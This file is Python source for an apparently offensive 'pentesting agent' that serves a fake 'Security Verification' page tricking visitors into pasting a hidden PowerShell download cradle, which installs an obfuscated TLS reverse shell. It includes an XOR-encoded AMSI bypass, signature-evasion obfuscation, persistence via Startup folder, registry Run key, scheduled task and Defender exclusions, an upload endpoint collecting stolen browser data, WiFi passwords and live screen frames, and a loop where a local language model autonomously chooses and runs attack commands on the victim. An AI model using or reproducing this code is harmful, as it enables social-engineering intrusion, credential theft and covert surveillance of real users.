#!/usr/bin/env python3
"""
Hybrid Pentesting Agent
- Phase 1: Auto-serve link, victim clicks, shell connects
- Phase 2: Menu appears, you choose what to do, agent executes through shell
"""

import os
import sys
import socket
import threading
import subprocess
import time
import ssl
import tempfile
import random
import string
import json
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt

console = Console()

# Check for optional cryptography library (needed for browser password decryption)
CRYPTO_AVAILABLE = False
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    CRYPTO_AVAILABLE = True
except ImportError:
    pass  # Will warn user later if they try to use browser decryption

# ============================================================================
# TLS CERTIFICATE GENERATION
# ============================================================================

def generate_self_signed_cert():
    """Generate ephemeral self-signed certificate for TLS encryption."""
    cert_dir = tempfile.mkdtemp()
    key_file = f"{cert_dir}/server.key"
    cert_file = f"{cert_dir}/server.crt"
    
    # Generate key + cert silently
    subprocess.run([
        "openssl", "req", "-x509", "-newkey", "rsa:2048",
        "-keyout", key_file, "-out", cert_file,
        "-days", "1", "-nodes", "-batch",
        "-subj", "/CN=localhost"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    return cert_file, key_file

# ============================================================================
# CONFIG
# ============================================================================

class Config:
    def __init__(self):
        self.public_ip = None
        self.listener_port = 4444
        self.http_port = 8080
        self.shell_socket = None
        self.shell_connected = False
        # Handshake secret (regenerated each run for security)
        self.handshake_secret = "agent-r-" + ''.join(random.choices(string.ascii_letters, k=8))
        # TLS cert paths (set at runtime)
        self.cert_file = None
        self.key_file = None
    
    def get_ip(self):
        if not self.public_ip:
            try:
                result = subprocess.run(["curl", "-s", "ifconfig.me"], 
                                       capture_output=True, text=True, timeout=5)
                self.public_ip = result.stdout.strip()
            except Exception:
                self.public_ip = "127.0.0.1"
        return self.public_ip

CFG = Config()

# ============================================================================
# AI AUTONOMOUS MODE (DeepSeek Coder via Ollama)
# ============================================================================

class AgentState:
    """Tracks what we know about the victim and our objectives."""
    def __init__(self):
        self.hostname = None
        self.username = None
        self.is_admin = False
        self.os_version = None
        self.defender_status = None
        self.edr_processes = []  # List of detected security/EDR processes
        self.wifi_passwords = []
        self.persistence_installed = False
        self.command_history = []
        self.iteration = 0
        
    def to_dict(self):
        return {
            "hostname": self.hostname,
            "username": self.username,
            "is_admin": self.is_admin,
            "os_version": self.os_version,
            "defender_status": self.defender_status,
            "edr_running": self.edr_processes,  # Include EDR info for AI
            "wifi_count": len(self.wifi_passwords),
            "persistence": self.persistence_installed,
            "iteration": self.iteration
        }

def ask_ai(prompt, max_tokens=500):
    """Query DeepSeek Coder via Ollama for next action."""
    try:
        response = requests.post(
            "http://localhost:11434/api/generate",
            json={
                "model": "deepseek-coder:6.7b",
                "prompt": prompt,
                "stream": False,
                "options": {"num_predict": max_tokens, "temperature": 0.3}
            },
            timeout=180
        )
        return response.json().get("response", "").strip()
    except Exception as e:
        return f"[AI ERROR: {e}]"

def ask_ai_streaming(prompt, max_tokens=500):
    """Query DeepSeek Coder with LIVE streaming output."""
    full_response = ""
    try:
        response = requests.post(
            "http://localhost:11434/api/generate",
            json={
                "model": "deepseek-coder:6.7b",
                "prompt": prompt,
                "stream": True,
                "options": {"num_predict": max_tokens, "temperature": 0.3}
            },
            stream=True,
            timeout=300
        )
        console.print("[bold magenta]AI Thinking (live):[/]")
        for line in response.iter_lines():
            if line:
                try:
                    data = json.loads(line)
                    token = data.get("response", "")
                    full_response += token
                    print(token, end="", flush=True)
                    if data.get("done"):
                        break
                except Exception:
                    pass
        print()
        return full_response.strip()
    except Exception as e:
        return f"[AI ERROR: {e}]"

def build_ai_prompt(state, last_output=""):
    """Build the prompt for the AI to decide next action."""
    
    # Build EDR-aware guidance
    edr_guidance = ""
    if state.edr_processes:
        edr_guidance = f"""
EDR/SECURITY SOFTWARE DETECTED: {', '.join(state.edr_processes)}
STEALTH MODE REQUIRED:
- Use ONLY LOLBins (certutil, bitsadmin, mshta, wmic)
- Use ONLY in-memory techniques
- Avoid file writes to disk
- Use encoded commands when possible
"""
    else:
        edr_guidance = """
NO EDR DETECTED - can use more aggressive techniques:
- Direct file writes allowed
- PowerShell scripts OK
- Registry modifications OK
"""
    
    return f"""You are an autonomous pentesting AI with shell access to a Windows victim.

CURRENT STATE:
{json.dumps(state.to_dict(), indent=2)}

LAST COMMAND OUTPUT:
{last_output[:1000] if last_output else "(none yet)"}
{edr_guidance}
OBJECTIVES (complete in order):
1. DETECT EDR - Check for security software: Get-Process | Where-Object {{$_.Name -match 'defender|crowdstrike|carbon|sentinel|cylance|sophos|mcafee|symantec'}}
2. RECON - Get hostname, username, check if admin (whoami /priv)
3. PERSIST - Install persistence (adapt based on EDR presence)
4. EXFIL - Extract WiFi passwords, browser data

RULES:
- Respond with ONLY ONE PowerShell command
- No explanations, just the command
- Use short, efficient commands  
- If EDR detected, use stealthier techniques
- If objective done, move to next

COMMAND:"""

def autonomous_mode():
    """Run AI-powered autonomous attack loop."""
    console.print(Panel("[bold cyan]AI AUTONOMOUS MODE[/]\nDeepSeek Coder 6.7B will decide what to do next.\nPress Ctrl+C to stop.", border_style="cyan"))
    
    state = AgentState()
    max_iterations = 30
    
    try:
        while state.iteration < max_iterations:
            state.iteration += 1
            
            # 1. Get last command output (if any)
            last_output = state.command_history[-1]["output"] if state.command_history else ""
            
            # 2. Ask AI for next command
            console.print(f"\n[dim]Thinking... (iteration {state.iteration}/{max_iterations})[/]")
            prompt = build_ai_prompt(state, last_output)
            ai_response = ask_ai(prompt)
            
            # 3. Parse command from response
            command = ai_response.strip().split("\n")[0]  # Take first line only
            if not command or command.startswith("[AI ERROR"):
                console.print(f"[red]{ai_response}[/]")
                time.sleep(5)
                continue
            
            # 4. Display AI's decision
            console.print(f"[bold yellow]AI Command:[/] {command}")
            
            # 5. Execute on victim
            console.print("[dim]Executing...[/]")
            result = SHELL.execute(command)
            
            # 6. Store in history
            state.command_history.append({"cmd": command, "output": result})
            
            # 7. Display result
            console.print(Panel(result[:500] if result else "[No output]", title="Output", border_style="green"))
            
            # 8. Update state based on output
            if "hostname" in command.lower() and result:
                state.hostname = result.strip()
            if "whoami" in command.lower() and result:
                state.username = result.strip()
                if "SeDebugPrivilege" in result or "High Mandatory Level" in result:
                    state.is_admin = True
            if "persistence" in command.lower() or "Startup" in command:
                state.persistence_installed = True
            if "Key Content" in result or "wifi" in command.lower():
                state.wifi_passwords.append(result)
            
            # 9. Detect EDR processes from output
            edr_names = ['defender', 'msmpeng', 'crowdstrike', 'csfalcon', 'carbonblack', 
                        'sentinel', 'cylance', 'sophos', 'mcafee', 'symantec', 'eset', 
                        'kaspersky', 'avast', 'avg', 'bitdefender', 'malwarebytes']
            if result:
                result_lower = result.lower()
                for edr in edr_names:
                    if edr in result_lower and edr not in [e.lower() for e in state.edr_processes]:
                        state.edr_processes.append(edr.capitalize())
                        console.print(f"[red]EDR Detected: {edr.capitalize()}[/]")
            
            # 9. Rate limit
            time.sleep(3)
            
    except KeyboardInterrupt:
        console.print("\n[yellow]Autonomous mode stopped by operator.[/]")
    
    console.print(f"\n[bold]Summary:[/] {state.iteration} commands executed")
    input("[Enter to return to menu]")

def ai_assistant_mode():
    """Interactive AI assistant - you tell it what to do in natural language."""
    console.print(Panel(
        "[bold cyan]AI ASSISTANT MODE[/]\n"
        "Tell the AI what you want to do in plain English.\n"
        "Example: 'find all wifi passwords' or 'list files in downloads'\n"
        "Type 'exit' to return to menu.",
        border_style="cyan"
    ))
    
    while True:
        try:
            user_request = input("\n[You] What do you want to do? > ").strip()
            
            if user_request.lower() == 'exit':
                break
            
            if not user_request:
                continue
            
            # Build prompt for command generation
            prompt = f"""You are a PowerShell expert helping with Windows system administration.
The user wants to: {user_request}

Generate ONLY the PowerShell command to accomplish this task.
- Return ONLY the command, no explanations
- Use one-liners when possible
- Make it efficient

POWERSHELL COMMAND:"""
            
            # Show the prompt being sent
            print()
            console.print(Panel(f"[bold]Your request:[/] {user_request}", title="Understanding Request", border_style="blue"))
            print()
            
            # USE STREAMING for live token display
            ai_response = ask_ai_streaming(prompt, max_tokens=300)
            print()
            
            # Parse command - strip markdown code blocks if present
            lines = [l.strip() for l in ai_response.strip().split("\n") if l.strip()]
            
            # Filter out markdown formatting
            lines = [l for l in lines if not l.startswith("```")]
            
            command = lines[0] if lines else ""
            
            if not command or command.startswith("[AI ERROR"):
                console.print(f"[red]Could not parse command from AI response[/]")
                continue
            
            # Show final command and ask for confirmation
            console.print(f"[bold yellow]→ Command:[/] {command}")
            confirm = input("Execute? [Y/n]: ").strip().lower()
            
            if confirm in ['', 'y', 'yes']:
                console.print("[dim]Executing...[/]")
                result = SHELL.execute(command)
                console.print(Panel(result if result else "[No output]", title="Result", border_style="green"))
            else:
                console.print("[dim]Skipped[/]")
                
        except KeyboardInterrupt:
            break
    
    console.print("[yellow]Exiting AI Assistant mode.[/]")

# ============================================================================
# EVASION HELPERS
# ============================================================================

# AMSI Bypass - Dynamic XOR-encoded to evade signatures
def get_amsi_bypass():
    """Generate XOR-encoded AMSI bypass at runtime."""
    # The actual bypass script (will be XOR encoded)
    bypass_ps = '$a=[Ref].Assembly.GetType("System.Management.Automation.Amsi"+"Utils");$f=$a.GetField("amsiInit"+"Failed","NonPublic,Static");$f.SetValue($null,$true)'
    
    # Random XOR key
    key = random.randint(1, 254)
    
    # XOR encode
    encoded = ','.join(str(ord(c) ^ key) for c in bypass_ps)
    
    # PowerShell decoder that runs from encoded bytes
    decoder = f'''$k={key};$e=@({encoded});$d=-join($e|%{{[char]($_-bxor $k)}});iex $d'''
    return decoder

def obfuscate_vars(script):
    """Randomize PowerShell variable names to evade static signatures."""
    import re
    
    var_map = {}
    vars_to_replace = ['$secret', '$hmac', '$hash', '$resp', '$chal', '$ssl', '$cmd', '$ch', '$h', '$p', '$t', '$w', '$r', '$o']
    
    for var in vars_to_replace:
        rand_name = '$' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(4,7)))
        var_map[var] = rand_name
    
    # Use regex for proper word-boundary matching
    # Sort by length descending to replace longer vars first (e.g., $secret before $s)
    for var in sorted(var_map.keys(), key=len, reverse=True):
        # Escape $ for regex, use word boundary at end
        pattern = re.escape(var) + r'(?=[^a-zA-Z0-9_]|$)'
        script = re.sub(pattern, var_map[var], script)
    
    return script

def get_tls_payload(ip, port, secret):
    """Generate TLS+handshake payload for persistence scripts."""
    return f'''while(1){{try{{
$h="{ip}";$p={port};$secret="{secret}";
$t=New-Object Net.Sockets.TcpClient($h,$p);
$ssl=New-Object Net.Security.SslStream($t.GetStream(),$false,({{$true}}));
$ssl.AuthenticateAsClient($h);
$w=New-Object IO.StreamWriter($ssl);$r=New-Object IO.StreamReader($ssl);
$w.AutoFlush=$true;
$ch=$r.ReadLine();
if($ch.StartsWith("CHALLENGE:")){{
$chal=$ch.Split(":")[1];
$hmac=New-Object Security.Cryptography.HMACSHA256;
$hmac.Key=[Text.Encoding]::UTF8.GetBytes($secret);
$hash=$hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes($chal));
$resp=($hash|ForEach-Object{{$_.ToString("x2")}}) -join "";
$w.WriteLine($resp);
}}
while($t.Connected){{$w.Write(">");$c=$r.ReadLine();if(!$c){{break}};$o=iex $c 2>&1|Out-String;$w.WriteLine($o)}}
}}catch{{}};Sleep 5}}'''

#
# SHELL MANAGER - Handles the reverse shell connection
# ============================================================================

class ShellManager:
    """Manages the reverse shell connection."""
    
    def __init__(self):
        self.sock = None
        self.conn = None
        self.addr = None
        self.connected = False
        self.ssl_context = None  # TLS context for wrapping client connections
    
    def start_listener(self, port):
        """Start TLS-encrypted listener with graceful port fallback."""
        # Generate TLS certificate
        console.print("[dim]Generating TLS certificate...[/]")
        CFG.cert_file, CFG.key_file = generate_self_signed_cert()
        
        # Create SSL context (will be used to wrap each client connection)
        self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        self.ssl_context.load_cert_chain(CFG.cert_file, CFG.key_file)
        
        for attempt_port in range(port, port + 10):
            try:
                raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                raw_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                raw_sock.bind(('0.0.0.0', attempt_port))
                raw_sock.listen(1)
                
                # Store RAW socket (NOT wrapped) - we wrap each accepted client
                self.sock = raw_sock
                
                if attempt_port != port:
                    console.print(f"[yellow]Port {port} busy, using {attempt_port}[/]")
                CFG.listener_port = attempt_port
                console.print(f"[green]TLS Listener on port {attempt_port}[/]")
                return
            except OSError:
                if raw_sock:
                    raw_sock.close()
                continue
        raise Exception(f"No available ports in range {port}-{port+9}!")
        
    def wait_for_connection(self, timeout=300):
        """Wait for shell to connect."""
        import hashlib
        import hmac
        
        self.sock.settimeout(timeout)
        start_time = time.time()
        
        while True:
            # Check for overall timeout
            if time.time() - start_time > timeout:
                return False
                
            try:
                # Accept raw TCP connection
                raw_conn, self.addr = self.sock.accept()
                console.print(f"[dim]Connection attempt from {self.addr[0]}...[/]")
                
                # BLOCK SPECIFIC IP (Example)
                # if self.addr[0] == "1.2.3.4":
                #    raw_conn.close()
                #    continue
                
                # Set timeout BEFORE SSL wrap to prevent hang on non-TLS clients
                raw_conn.settimeout(10)
                
                # Wrap in SSL (TLS handshake happens here)
                try:
                    self.conn = self.ssl_context.wrap_socket(raw_conn, server_side=True)
                    console.print(f"[dim]TLS handshake OK from {self.addr[0]}[/]")
                except ssl.SSLError as e:
                    console.print(f"[yellow]SSL handshake failed from {self.addr[0]}: {e}[/]")
                    raw_conn.close()
                    continue
                except socket.timeout:
                    console.print(f"[yellow]SSL handshake timeout from {self.addr[0]} (non-TLS client)[/]")
                    raw_conn.close()
                    continue
                except Exception as e:
                    console.print(f"[red]SSL error from {self.addr[0]}: {e}[/]")
                    raw_conn.close()
                    continue
                
                # SECURE HANDSHAKE (Challenge-Response)
                self.conn.settimeout(10)
                try:
                    # Send challenge
                    challenge = os.urandom(16).hex()
                    self.conn.send(f"CHALLENGE:{challenge}\n".encode())
                    
                    # Wait for response
                    response = self.conn.recv(256).decode().strip()
                    
                    # Compute expected HMAC
                    expected = hmac.new(
                        CFG.handshake_secret.encode(),
                        challenge.encode(),
                        hashlib.sha256
                    ).hexdigest()
                    
                    if response.lower() == expected.lower():
                        self.connected = True
                        console.print(f"[bold green]AUTHENTICATED SHELL from {self.addr[0]}![/]")
                        # Read initial prompt
                        try:
                            initial = self.conn.recv(4096).decode(errors='ignore')
                            console.print(f"[dim]{initial.strip()}[/]")
                        except Exception:
                            pass
                        return True
                    else:
                        console.print(f"[yellow]Rejected {self.addr[0]} (Invalid handshake response)[/]")
                        self.conn.close()
                        continue
                except socket.timeout:
                    console.print(f"[yellow]Ignored {self.addr[0]} (Handshake timeout)[/]")
                    self.conn.close()
                    continue
                except Exception as e:
                    console.print(f"[red]Handshake error: {e}[/]")
                    self.conn.close()
                    continue
            except socket.timeout:
                continue
            except Exception:
                return False
    
    def check_connection(self):
        """Check if shell is still alive."""
        try:
            self.conn.send(b"\n")
            return True
        except Exception:
            self.connected = False
            return False
    
    def wait_for_new_shell(self, timeout=30):
        """Wait for a new shell connection (e.g., after UAC bypass)."""
        console.print(f"[cyan]Waiting for new shell connection (up to {timeout}s)...[/]")
        try:
            self.sock.settimeout(timeout)
            new_conn, new_addr = self.sock.accept()
            # Keep the old connection if it still works
            self.conn = new_conn
            self.addr = new_addr
            self.connected = True
            console.print(f"[bold green]NEW SHELL from {new_addr[0]}![/]")
            # Read initial prompt
            self.conn.settimeout(2)
            try:
                initial = self.conn.recv(4096).decode(errors='ignore')
                console.print(f"[dim]{initial}[/]")
            except Exception:
                pass
            return True
        except socket.timeout:
            console.print("[yellow]No new shell connected.[/]")
            return False
    
    def execute(self, cmd):
        """Execute command and return output."""
        if not self.connected:
            return "Not connected!"
        
        try:
            # Clear any pending output first
            self.conn.setblocking(0)
            try:
                while True:
                    self.conn.recv(4096)
            except Exception:
                pass
            self.conn.setblocking(1)
            
            # Use unique delimiter for reliable output parsing
            # This avoids issues with different shell prompts (PS, cmd, customized)
            delimiter = "---END-CMD-OUTPUT---"
            wrapped_cmd = f"{cmd}; Write-Host '{delimiter}'"
            
            # Send command with delimiter
            self.conn.send((wrapped_cmd + "\n").encode())
            self.conn.settimeout(30)
            output = ""
            
            # Read output until we see our unique delimiter
            while True:
                try:
                    chunk = self.conn.recv(4096).decode(errors='ignore')
                    if not chunk:
                        break
                    output += chunk
                    
                    # Check for our delimiter - reliable end detection
                    if delimiter in output:
                        break
                except socket.timeout:
                    break
            
            # Clean up - remove delimiter and everything after it
            if delimiter in output:
                output = output.split(delimiter)[0]
            
            # Remove prompt lines and clean up
            lines = output.strip().split('\n')
            cleaned = []
            for line in lines:
                stripped_line = line.strip()
                # Skip prompt lines
                if stripped_line.startswith("PS") and stripped_line.endswith(">"):
                    continue
                if stripped_line == "PS>":
                    continue
                # Skip the command echo
                if cmd.strip() in stripped_line:
                    continue
                cleaned.append(line)
            
            result = '\n'.join(cleaned).strip()
            return result if result else "[No output captured]"
        except BrokenPipeError:
            self.connected = False
            return "[Shell disconnected - Defender may have killed it]"
        except Exception as e:
            self.connected = False
            return f"[Error: {e}]"
    
    def close(self):
        """Close connection."""
        if self.conn:
            try:
                self.conn.close()
            except Exception:
                pass
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
        self.connected = False

SHELL = ShellManager()

# ============================================================================
# HTTP SERVER - Serves the ClickFix page
# ============================================================================

class ClickFixHandler(BaseHTTPRequestHandler):
    """HTTP handler that serves ClickFix page and payload."""
    
    # def log_message(self, format, *args):
    #     pass  # Suppress logs
    
    def do_GET(self):
        ip = CFG.get_ip()
        port = CFG.listener_port
        
        if self.path == '/s':
            # Memory-only payload for IEX download cradle
            # Victim runs: IEX(IWR http://IP:PORT/s -UseBasic).Content
            secret = CFG.handshake_secret
            
            core_payload = f'''while($true){{try{{
$h='{ip}';$p={CFG.listener_port};$secret='{secret}';
$t=New-Object Net.Sockets.TcpClient($h,$p);
$ssl=New-Object Net.Security.SslStream($t.GetStream(),$false,({{$true}}));
$ssl.AuthenticateAsClient($h);
$w=New-Object IO.StreamWriter($ssl);$r=New-Object IO.StreamReader($ssl);
$w.AutoFlush=$true;
$ch=$r.ReadLine();
if($ch.StartsWith("CHALLENGE:")){{
$chal=$ch.Split(":")[1];
$hmac=New-Object Security.Cryptography.HMACSHA256;
$hmac.Key=[Text.Encoding]::UTF8.GetBytes($secret);
$hash=$hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes($chal));
$resp=($hash|ForEach-Object{{$_.ToString("x2")}}) -join '';
$w.WriteLine($resp);
}}
while($t.Connected){{$w.Write("PS>");$cmd=$r.ReadLine();if(!$cmd){{break}};$o=iex $cmd 2>&1|Out-String;$w.WriteLine($o)}}
}}catch{{}};Start-Sleep -Seconds 5}}'''
            # Apply evasion - NO AMSI bypass (gets detected), just variable obfuscation
            final_payload = obfuscate_vars(core_payload)
            
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(final_payload.encode())

        elif self.path == '/watch':
            # Live Monitor Viewer
            html = '''<!DOCTYPE html><html><head><title>Live Monitor</title>
<style>body{background:#000;color:#0f0;display:flex;flex-direction:column;align-items:center;font-family:monospace;margin:0}
h1{margin:10px} img{border:2px solid #0f0;max-width:95%;max-height:85vh;object-fit:contain}
</style><script>
setInterval(()=>{ document.getElementById("v").src="/live.jpg?t="+new Date().getTime(); }, 500);
</script></head><body><h1>🔴 LIVE FEED</h1><img id="v" src="/live.jpg"></body></html>'''
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html.encode())

        elif self.path == '/live.jpg':
            # Serve the latest frame
            try:
                with open("live.jpg", "rb") as f:
                    data = f.read()
                self.send_response(200)
                self.send_header('Content-type', 'image/jpeg')
                self.end_headers()
                self.wfile.write(data)
            except Exception:
                self.send_response(404); self.end_headers()
            
        elif self.path == '/v':
            # Serve the VBS Loader file
            # Updated to use cmd /c shim for better reliability
            vbs = f'''Set W = CreateObject("WScript.Shell")
p = W.ExpandEnvironmentStrings("%APPDATA%") & "\\winlogon.ps1"
W.Run "cmd /c powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & p & """", 0, False'''
            
            self.send_response(200)
            self.send_header('Content-type', 'text/plain') # Force download as text
            self.end_headers()
            self.wfile.write(vbs.encode())

        elif self.path == '/p':
            # Serve TLS-encrypted reverse shell with HMAC handshake
            # Includes AMSI bypass + variable obfuscation for evasion
            secret = CFG.handshake_secret
            
            # Core payload (before obfuscation)
            core_payload = f'''while($true){{try{{
$h='{ip}';$p={CFG.listener_port};$secret='{secret}';
$t=New-Object Net.Sockets.TcpClient($h,$p);
$ssl=New-Object Net.Security.SslStream($t.GetStream(),$false,({{$true}}));
$ssl.AuthenticateAsClient($h);
$w=New-Object IO.StreamWriter($ssl);$r=New-Object IO.StreamReader($ssl);
$w.AutoFlush=$true;
$ch=$r.ReadLine();
if($ch.StartsWith("CHALLENGE:")){{
$chal=$ch.Split(":")[1];
$hmac=New-Object Security.Cryptography.HMACSHA256;
$hmac.Key=[Text.Encoding]::UTF8.GetBytes($secret);
$hash=$hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes($chal));
$resp=($hash|ForEach-Object{{$_.ToString("x2")}}) -join '';
$w.WriteLine($resp);
}}
while($t.Connected){{$w.Write("PS>");$cmd=$r.ReadLine();if(!$cmd){{break}};$o=iex $cmd 2>&1|Out-String;$w.WriteLine($o)}}
}}catch{{}};Start-Sleep -Seconds 6}}'''
            
            # Apply evasion - NO AMSI bypass (gets detected), just obfuscation
            final_payload = obfuscate_vars(core_payload)
            
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(final_payload.encode())
            

            
        else:
            # Serve ClickFix page - Direct PowerShell command
            
            one_liner = f'''powershell -w hidden -ep bypass -c "IEX(IWR http://{ip}:{CFG.http_port}/s -UseBasic).Content"'''
            
            html = f'''<!DOCTYPE html>
<html>
<head><title>System Update</title>
<style>
body{{font-family:'Segoe UI',sans-serif;background:#1a1a2e;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0}}
.box{{background:#16213e;padding:30px;border-radius:15px;text-align:center;max-width:700px;width:90%}}
h2{{color:#0f9d58;margin-bottom:20px}}
.cmd-box{{background:#0d1117;border:2px solid #0f9d58;border-radius:8px;padding:15px;margin:20px 0;font-family:monospace;font-size:12px;word-break:break-all;text-align:left;color:#58a6ff}}
.btn{{background:#0f9d58;color:#fff;border:none;padding:15px 40px;border-radius:8px;cursor:pointer;font-size:16px;transition:0.3s;margin-top:10px}}
.btn:hover{{background:#0b8043}}
.instructions{{background:#1f2e4f;padding:15px;border-radius:8px;margin-top:20px;text-align:left}}
.instructions li{{margin:8px 0;color:#ccc}}
p{{color:#ccc;font-size:14px}}
.success{{color:#0f9d58;font-size:18px;display:none;margin-top:15px}}
</style>
</head>
<body>
<div class="box">
<h2>Security Verification Required</h2>
<p>Copy the command below and run it to complete verification.</p>

<div class="cmd-box" id="cmdBox">{one_liner}</div>

<button class="btn" onclick="copyCmd()">Copy Command</button>
<div class="success" id="success">Copied! Now run it.</div>

<div class="instructions">
<strong>Instructions:</strong>
<ol>
<li>Click <strong>Copy Command</strong> above</li>
<li>Press <strong>Win + R</strong> (opens Run dialog)</li>
<li>Press <strong>Ctrl + V</strong> to paste</li>
<li>Press <strong>Enter</strong></li>
</ol>
</div>

</div>

<textarea id="cmdText" style="position:absolute;left:-9999px">{one_liner}</textarea>

<script>
function copyCmd() {{
    document.getElementById('cmdText').select();
    document.execCommand('copy');
    document.getElementById('success').style.display = 'block';
    document.querySelector('.btn').innerText = 'Copied!';
    document.querySelector('.btn').style.background = '#0b8043';
}}
</script>
</body>
</html>'''
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html.encode())
            
            console.print(f"[yellow]Page served to {self.client_address[0]}[/]")

    def do_POST(self):
        """Handle data exfiltration uploads (Text & Binary)."""
        try:
            if self.path.startswith('/ups'):
                from urllib.parse import urlparse, parse_qs
                query = parse_qs(urlparse(self.path).query)
                
                dtype = query.get('t', ['unknown'])[0]
                browser = query.get('b', ['unknown'])[0]
                target_id = query.get('id', ['unknown'])[0]
                
                # Get body as BYTES (crucial for images)
                length = int(self.headers.get('Content-Length', 0))
                data = self.rfile.read(length)
                
                if dtype == 'live':
                    # Save "Live Feed" frame
                    with open("live.jpg", "wb") as f:
                        f.write(data)
                    self.send_response(200); self.end_headers()
                    return

                # Normal Loot (Keys/DBs)
                loot_dir = os.path.join(os.path.dirname(__file__), "loot")
                os.makedirs(loot_dir, exist_ok=True)
                
                fname = f"{dtype}_{target_id}_{browser}.txt"
                fpath = os.path.join(loot_dir, fname)
                
                with open(fpath, 'wb') as f:
                    f.write(data)
                
                console.print(f"[green]Creating loot file: {fname}[/]")
                self.send_response(200); self.end_headers()
            else:
                self.send_response(404); self.end_headers()
        except Exception as e:
            console.print(f"[red]Upload error: {e}[/]")
            self.send_response(500); self.end_headers()

    def log_message(self, format, *args):
        # Suppress logs for live feed to prevent spam
        # args[0] can be HTTPStatus (int) or string, so check type first
        if args and isinstance(args[0], str):
            if "GET /live.jpg" in args[0] or "GET /watch" in args[0] or "POST /ups?t=live" in args[0]:
                return
        # Default logging for others
        try:
            sys.stderr.write("%s - - [%s] %s\n" %
                             (self.client_address[0],
                              self.log_date_time_string(),
                              format%args))
        except Exception:
            pass  # Ignore logging errors
def start_http_server():
    """Start HTTP server in background."""
    # Use ThreadingHTTPServer to handle multiple requests (user + victim) concurrently
    from http.server import ThreadingHTTPServer
    server = ThreadingHTTPServer(('0.0.0.0', CFG.http_port), ClickFixHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server

# ============================================================================
# POST-EXPLOITATION MENU
# ============================================================================

def show_menu(title, options):
    """Show menu and get choice."""
    table = Table(show_header=False, box=None)
    table.add_column("Opt", style="bold yellow")
    table.add_column("Desc", style="white")
    for opt, desc in options:
        table.add_row(f"[{opt}]", desc)
    console.print(Panel(table, title=f"[bold cyan]{title}[/]", border_style="cyan"))
    valid = [str(o[0]) for o in options]
    return Prompt.ask("Choose", choices=valid, default="0")

def menu_persistence():
    """Persistence submenu."""
    while True:
        os.system('clear')
        choice = show_menu("PERSISTENCE", [
            ("1", "Startup Folder"),
            ("2", "Registry Run Key"),
            ("3", "Scheduled Task (needs admin)"),
            ("4", "Startup + Defender Exclusion (stealthier!)"),
            ("5", "Secure Dir Persistence (User Path)"),
            ("6", "LOLBin: mshta.exe Launcher"),
            ("7", "LOLBin: rundll32 Launcher"),
            ("0", "← Back"),
        ])
        
        if choice == "0":
            break
        elif choice == "1":
            ip = CFG.get_ip()
            port = CFG.listener_port
            secret = CFG.handshake_secret
            tls_payload = get_tls_payload(ip, port, secret).replace("'", "''")  # Escape quotes for PS
            cmd = f'''$s='{tls_payload}';$s|Out-File "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\u.ps1";echo "TLS Persistence installed!"'''
            console.print("[cyan]Installing TLS startup persistence...[/]")
            result = SHELL.execute(cmd)
            console.print(f"[green]{result}[/]")
            input("\n[Enter to continue]")
        elif choice == "2":
            # First add exclusion for Startup folder, then add registry
            startup_path = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
            cmd = f'try{{Add-MpPreference -ExclusionPath "{startup_path}" -ErrorAction SilentlyContinue}}catch{{}};reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v WindowsUpdate /d "powershell -w hidden -ep bypass -f %APPDATA%\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\u.ps1" /f;echo "Registry + Exclusion done!"'
            console.print("[cyan]Adding exclusion + registry persistence...[/]")
            result = SHELL.execute(cmd)
            console.print(f"[green]{result}[/]")
            input("\n[Enter to continue]")
        elif choice == "3":
            cmd = 'schtasks /create /tn "WindowsUpdate" /tr "powershell -w hidden -ep bypass -f %APPDATA%\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\u.ps1" /sc onlogon /rl highest /f'
            console.print("[cyan]Creating scheduled task...[/]")
            result = SHELL.execute(cmd)
            console.print(f"[green]{result}[/]")
            input("\n[Enter to continue]")
        elif choice == "4":
            # Install persistence AND add to Defender exclusion
            ip = CFG.get_ip()
            port = CFG.listener_port
            secret = CFG.handshake_secret
            startup_path = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
            tls_payload = get_tls_payload(ip, port, secret).replace("'", "''")
            cmd = f'''try{{Add-MpPreference -ExclusionPath "{startup_path}" -ErrorAction SilentlyContinue}}catch{{}};$s='{tls_payload}';$s|Out-File "{startup_path}\\u.ps1";echo "Done! TLS Exclusion + persistence installed."'''
            console.print("[cyan]Adding Startup to Defender exclusion + Installing TLS persistence...[/]")
            console.print("[yellow]Note: Exclusion needs admin, but may work silently[/]")
            result = SHELL.execute(cmd)
            console.print(f"[green]{result}[/]")
            input("\n[Enter to continue]")
        elif choice == "5":
            # Secure Directory Persistence (User Custom Path) with TLS
            ip = CFG.get_ip()
            port = CFG.listener_port
            secret = CFG.handshake_secret
            secure_path = "$env:LOCALAPPDATA\\Microsoft\\Windows\\Microsoft projects"
            payload_name = "winlogon.ps1"
            tls_payload = get_tls_payload(ip, port, secret).replace("'", "''")
            
